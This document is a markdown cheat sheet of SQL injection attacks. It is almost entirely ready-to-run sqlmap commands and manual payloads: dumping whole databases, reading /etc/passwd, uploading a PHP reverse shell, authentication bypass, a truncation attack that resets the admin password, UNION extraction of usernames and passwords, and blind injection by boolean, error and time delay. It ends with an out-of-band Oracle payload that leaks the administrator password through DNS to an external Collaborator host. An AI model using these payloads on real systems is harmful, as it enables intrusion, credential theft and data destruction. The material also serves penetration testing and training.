## Sqlmap techniques
### Enumerate sql with sqlmap
```
sqlmap -u [url] --dump-all --forms --threads=10
sqlmap -u [url] --dbs --forms --crawl=2
sqlmap -r [get request file] --dbs --batch --random-agent
sqlmap -r [get request file] --dump-all --batch
sqlmap -r [get request file] --risk=3 --level=5 --dump-all --threads 5
sqlmap -r [get request file] --risk=3 --level=5 --dbs --batch
sqlmap -r [get request file] --cookie='token=[cookie]' --technique=U --delay=2 --dump
sqlmap -r [get request file] --risk=3 --level=5 --threads=5 --dump-all
sqlmap -r [get request file] --current-user --privileges
sqlmap -r [get request file] --file-read=/etc/passwd
sqlmap -r [get request file] --file-write=php-reverse-shell.php --file-dest=/var/www/html/exploit.php --random-agent
sqlmap -r [request file] --os-shell --forms
sqlmap -r [request file] --sql-shell
sqlmap -r [request file] --sql-query \ "INSERT INTO products (name) VALUES ('TEST')"
```
### Get database tables with sqlmap
```
sqlmap -r [get request file] -D [db name] --tables
sqlmap -r [get request file] -D [db name] --tables --risk=3 --level=5
```
### Get database columns with sqlmap
```
sqlmap -r [get request file] -D [db name] -T [table name] --columns
```
### Dump data from database with sqlmap
```
sqlmap -r [get request file] --current-db [db name] -T [table name] -C [col name] --dump 
sqlmap -r [get request file] -D [db name] -T [table name] --dump --no-cast --risk=3 --level=5 --threads=5
```

## Sql injection methods & technques
### Common syntax for injection
```
SELECT * FROM [tb name]
SELECT [col name] FROM [tb name]
SELECT * FROM [tb name] LIMIT 1 {limit 1 only returns a row of data}
SELECT * FROM [tb name] LIMIT 1,1 {limit 1,1 skips a row of data and returns a row of data}
SELECT * FROM [tb name] WHERE [col name]='[data]'
SELECT * FROM [tb name] WHERE [col name]!='[data]'
SELECT * FROM [tb name] WHERE [col name] like 'a%'
SELECT * FROM [tb name] WHERE [col name] like '%n'
SELECT * FROM [tb name] UNION SELECT * FROM [tb name]
SELECT * FROM [tb name] WHERE [col name]='[data]';-- {; means the end of query, -- means commenting}
INSERT INTO [tb name] ([col name]) VALUES ('[data]')
UPDATE [tb name] SET [col name]='[data]' WHERE username='[data]'
DELETE FROM [tb name] WHERE [col name]='[data]'
DELETE FROM [tb name] LIMIT 1,1
database() {to get database name}
group_concat(table_name) FROM information_schema.tables WHERE table_schema='[db name]' {list tables in db}
group_concat(column_name) FROM information_schema.columns WHERE table_name='[tb name]' {tables structure}
group_concat([col name], ':', [col name] SEPARATOR '<br>') FROM [tb name] {retrieve data}
' OR 1=1;-- {always returns query as true}
' OR 1=1 -- - {always returns query as true}
`urlencode "0 UNION SELECT 1,database(),3,4"` | tail {get database name}
`urlencode "0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='marketplace'"` | tail {get table names}
`urlencode "0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'"` | tail {get column names}
`urlencode "0 UNION SELECT 1,GROUP_CONCAT([col name],':',[col name] SEPARATOR '<br>'),3,4 FROM users"` {retrieve data}
```

### Retrieval of hidden data
```
https://example.com/filter?category=Acessories'+OR+1=1--
# The sql query will return as "SELECT * FROM filter WHERE category = 'Accessories' OR 1=1--"
# The "--" command sequence is to comment out the remainder of the original query
```

### Allowing authentication bypass
When a user tries to log in into an app, the sql query that will be carry out to the server is 
```
SELECT * FROM users WHERE username='admin' AND password='password123'
```
An attacker can inject SQL commands into the input function
```
administrator'-- -
# The "--" command sequence id to comment out the remainder of the original query
```

### Sql truncation attack
When a user is registering into an app, the back-end is not validating the characters length wether it has exceeded or not

If you try to register with a username with a lot of spaces that exceeds the characters length, the spaces will get truncated and it should not be saved to the database

However, if we add another arbitrary character after giving blank spaces to the input, that arbitrary character would get truncated also and your data should be saved into the database.
```
username=admin[spaces]a&password=test
```
If there is a user named admin in the database, the password input will be inserted into the column where username admin exists and this will causes the admin's password to be changed into "test"


###  Basic SQL injection attack
Determine the number of columns of the original query
```
http://example.com/admin?user=-1 union select 1,2,3,4-- -
# Since there is no error, we can assume there are only 4 columns retrieved in the original query
```
Determine the database
```
http://example.com/admin?user=-1 union select (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),2,3,4-- -
```
Determining the tables
```
http://example.com/admin?user=-1 union select (select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='marketplace'),2,3,4-- -
```
Retrieves the data from tables
```
http://example.com/admin?user=-1 union select group_concat([column-name]),null,null,null from [table name]-- -
```

### Retrieving data from other database tables with UNION query
For UNION query, 2 conditions must be met

1. The individual queries must return the same number of columns
```
> Determinining the number of columns with ORDER BY query
> submit a query " ' ORDER BY 1-- "
> increment the index until the database returns an error
> the error would be something like "The ORDER BY position number 3 is out of range of the number of items in the select list."
> now an attacker would know there are only two columns that is being returned for the application


> determining the number of colums with UNION SELECT query
> submit a query " ' UNION SELECT NULL,NULL-- "
> if the number of nulls does not match the number of columns, the database returns an error
> the error would be something like "All queries combined using a UNION,  INTERSECT or EXCEPT operator must have an equal number of expressions in their target list."
> if the number of nulls mathes the number of columns, the database could return an additional row in the response

> determining the number of columns with UNION SELECT query
> submit a query " -1 UNION SELECT 1,2,3,4-- -"
> increment the index until the database returns an error
> the error would be something like "The ORDER BY position number 3 is out of range of the number of items in the select list."
```

2. the data types in each column must be compatible between the individual queries
```
> determining the data types of each column by adding string value in UNION SELECT query
> submit a query " ' UNION SELECT 'a',NULL,NULL,NULL-- " if the number of columns returned are four
> for int data type it would be " ' UNION SELECT 1,NULL,NULL,NULL-- "
> if data type of a column is not compatible with the declared data type, a database error will occur
> the error is "Conversion failed when converting the varchar value 'a' to data type int." or "Conversion failed when converting the int value '1' to data type varchar"
```
### SQL injection UNION attack
> first, determine how many columns are returned from the original query
> next determine what data type each column holds
> only then, an UNION attack can be carried out
> assume that we want to retrieve the username and password from the users table
> submit a query: ' UNION SELECT username,password FROM users-- 
> observe the application's response and the data is successfully retrieved

### Examining the database in SQL injection attacks
#### Listing database contents on non-Oracle databases
Determine how many columns are returned from the original query
```
' UNION SELECT NULL,NULL--
```
Determine what data types each column holds
```
' UNION SELECT 'a','a'--
```
Get table names
```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```
Get column names
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```
Get data from table
```
' UNION SELECT username,password FROM users--
```

#### Listing database contents on Oracle
Determine how many columns are returned from the original query
```
' UNION SELECT NULL,NULL FROM dual--
```
Determine what data types each column holds
```
' UNION SELECT 'a','a' FROM dual--
```
Get table names
```
' UNION SELECT table_name,NULL FROM all_tables--
```
Get column names
```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='users'--
```
Get data from table
```
' UNION SELECT username,password FROM users--
```

### Retrieving multiple values in a single column on Oracle
```
' UNION SELECT username || '~' || password FROM users--
# The results from the query will be something like "admin~password123"
```

### Retrieving multiple values in a single column on MySql
Determine how many columns are returned from the original query
```
' UNION SELECT NULL,NULL--
```
Determine what data types each column holds
```
' UNION SELECT 1,'a'--
```
Since we are trying to return a string data type query, we will only use the second column as the first one is of integer type

Get table names
```
' UNION SELECT NULL,table_name FROM information_schema.tables--
```
Get column names
```
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
```
Get data from tables (concat function combine multiple values within a single column)
```
' UNION SELECT NULL,CONCAT(username,password) FROM users--
```

## Blind SQL injection
### Exploiting blind sql injection by triggering conditional responses on cookie value
1 = 1 is true, the website is going to respond with a "welcome back" message since the sql query is true
```
Cookie= TrackingId=xyz' AND '1'='1
```
1 is not = 2, then the website is not going to respond with a "welcome back" message since the sql query is false
```
Cookie= TrackingId=xyz' AND '1'='2
```
See if there is a table name users in the database, if the website respond with the message then that means there is a table name users
```
Cookie= TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
See if there is a user called admin in the table, if the website respong with the message then that means there is a user called admin
```
Cookie= TrackingId=xyz' AND(SELECT 'a' FROM users WHERE username='admin')='a
```
See if the password length is greater than 1, in this case a message will be return because it is true the password length is greater than 1
```
Cookie= TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='admin' AND LENGTH(password)>1)='a
```
See if the first character of the password is equal to 'a', if it is true then the website will respond a message
```
cookie= TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a
# Keep incrementing the offset until it matches the length of the password
```

### Exploiting blind sql injection by triggering conditional error on Oracle
Confirm the server is intrepreting the injection as SQL query if the http status code is 200, this means the injection is accepted as SQL query
```
TrackingId= xyz'||(SELECT '' FROM dual)||'
```
Verify that table calles users exist
```
TrackingId= xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```
If an error message is received, this means the CASE query is true
```
TrackingId= xyz'||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Check wether the username admin exists
```
TrackingId= xyz'||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin')||'
```
Determine how many characters are in the password
```
TrackingId= xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin')||'
```
See if the first character of the password is equal to 'a'. if it is true then an error will be displayed
```
TrackingId= xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0)+ELSE '' END FROM users WHERE username='admin')||'
Keep incrementing the offset until it matches the length of the password
```

### Exploiting blind sql injection by triggering time delay on Postgresql
The application will take 10 seconds to respond because the condition is true, if the condition is false then there will be no delays in response
```
TrackingId=xyz'%3BSELECT CASE WHEN(1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
Confirming if there is user called admin
```
TrackingId=xyz'%3BSELECT CASE WHEN(username='admin') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
Confirming that the password is greater than 1 character in length
```
TrackingId=xyz'%3BSELECT CASE WHEN(username='admin' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
Test the character at each position of the password characters
```
TrackingId=xyz'%3BSELECT CASE WHEN(username='admin' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
# Use burpsuite intruder to test each characters
# Set the positon and payloads but for resource pool, add a new one with the "Maximum concurrent requests" set to 1
# Start the attack and go to the columns tab, check the box for "response received"
# Normally the number of response received would be in the region of 10,000 miliseconds
```

### Exploiting blind sql injection by triggering dns lookup on Oracle
The SQL queries will trigger a DNS lookup to Burp Collaborator domain
```
TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
We can modify the payload to leak the administrator's password in an interaction with the Collaborator server
```
TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.xwx7bqlvhiwjbf9yhu39b4ogr7xyln.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
Send the request and click POLL NOW on Collaborator client

In one of the DNS lookup, you can see the full domain name that was looked up is shown in the Description tab and the password for administrator is included in the domain name

